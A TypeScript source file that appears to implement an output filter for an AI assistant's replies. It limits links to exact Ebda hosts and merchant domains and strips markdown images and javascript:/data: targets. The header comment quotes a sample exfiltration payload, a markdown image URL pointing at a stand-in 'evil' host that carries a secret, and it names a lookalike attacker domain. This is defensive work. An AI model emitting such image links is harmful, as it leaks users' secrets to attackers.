/**
 * Output rail 12: link and image allowlist (plan 4 Task A9, gap 4). A reply may link only to `https` pages on Ebda's own FIXED
 * hosts (exact list below, NOT `*.ebda.app`: merchants own subdomains there, so a wildcard would trust attacker pages) and to the merchant's
 * own domains as the adapter lists them (no userinfo, no port, no lookalike suffix such as `ebda.app.evil.com`). Everything else
 * is reduced to plain text, and markdown images are dropped to their alt text: an image URL is a data-exfiltration channel
 * (`![x](https://evil/p?d=<secret>)`), and `data:` / `javascript:` targets never survive.
 */
import type { Segment } from '../types';

const URLPART = '((?:[^()\\s]|\\([^()\\s]*\\))*)';
const TOKEN = new RegExp(`!\\[([^\\]]*)\\]\\(${URLPART}\\)|\\[([^\\]]*)\\]\\(${URLPART}\\)|(https?:\\/\\/[^\\s<>\\[\\]"'«»]+|(?:javascript|data|vbscript):\\S+)`, 'gi');
const TRAIL = /[.,;:!?)،؛]+$/;

const hostOf = (d: string): string => d.trim().toLowerCase().replace(/^[a-z]+:\/\//, '').replace(/[/:?#].*$/, '').replace(/\.$/, '');

/** Hosts Ebda itself serves (exact match). Add a host here only when Ebda, not a tenant, controls everything on it. */
export const EBDA_HOSTS: readonly string[] = ['ebda.app', 'help.ebda.app', 'whatsapp.ebda.app'];

export function isAllowedUrl(href: string, merchantDomains: string[]): boolean {
  let u: URL;
  try {
    u = new URL(href);
  } catch {
    return false;
  }
  if (u.protocol !== 'https:' || u.username || u.password || u.port) return false;
  const host = u.hostname.toLowerCase().replace(/\.$/, '');
  const ok = (d: string): boolean => host === d || host.endsWith(`.${d}`);
  return EBDA_HOSTS.includes(host) || merchantDomains.map(hostOf).filter(Boolean).some(ok);
}

const origin = (href: string): string => {
  try {
    const u = new URL(href);
    return `${u.protocol}//${u.hostname}`;
  } catch {
    return 'unparseable';
  }
};

export function allowLinks(segments: Segment[], merchantDomains: string[]): { segments: Segment[]; removed: string[] } {
  const removed: string[] = [];
  const out: Segment[] = [];
  const text = (t: string) => { if (t) out.push({ kind: 'text', text: t }); };
  for (const seg of segments) {
    if (seg.kind === 'cap') { out.push(seg); continue; }
    if (seg.kind === 'link') {
      if (isAllowedUrl(seg.href, merchantDomains)) out.push(seg);
      else { removed.push(`link:${origin(seg.href)}`); text(seg.text); }
      continue;
    }
    if (seg.kind === 'cite') {
      if (isAllowedUrl(seg.url, merchantDomains)) out.push(seg);
      else { removed.push(`link:${origin(seg.url)}`); text(seg.title); }
      continue;
    }
    let pos = 0;
    for (const m of seg.text.matchAll(TOKEN)) {
      text(seg.text.slice(pos, m.index));
      pos = m.index! + m[0].length;
      if (m[1] !== undefined) { removed.push(`image:${origin(m[2] ?? '')}`); text(m[1]); continue; } // image: alt text only
      if (m[3] !== undefined) {
        const href = m[4] ?? '';
        if (isAllowedUrl(href, merchantDomains)) out.push({ kind: 'link', href, text: m[3] || href });
        else { removed.push(`link:${origin(href)}`); text(m[3]); }
        continue;
      }
      const raw = m[5]!;
      const trail = TRAIL.exec(raw)?.[0] ?? '';
      const href = trail ? raw.slice(0, -trail.length) : raw;
      if (isAllowedUrl(href, merchantDomains)) out.push({ kind: 'link', href, text: href });
      else removed.push(`link:${origin(href)}`);
      text(trail);
    }
    text(seg.text.slice(pos));
  }
  return { segments: out, removed };
}
